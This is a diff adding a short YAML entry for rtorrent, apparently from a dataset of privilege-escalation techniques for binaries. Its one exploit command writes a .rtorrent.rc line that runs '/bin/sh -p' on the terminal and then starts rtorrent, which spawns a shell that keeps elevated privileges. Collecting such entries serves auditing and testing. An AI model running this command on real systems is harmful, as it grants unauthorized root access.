@@ -1,0 +1,6 @@
+name: rtorrent
+binary_path: /usr/bin/rtorrent
+exploit_cmds:
+- 'echo ''execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"'' >~/.rtorrent.rc
+
+  /usr/bin/rtorrent'
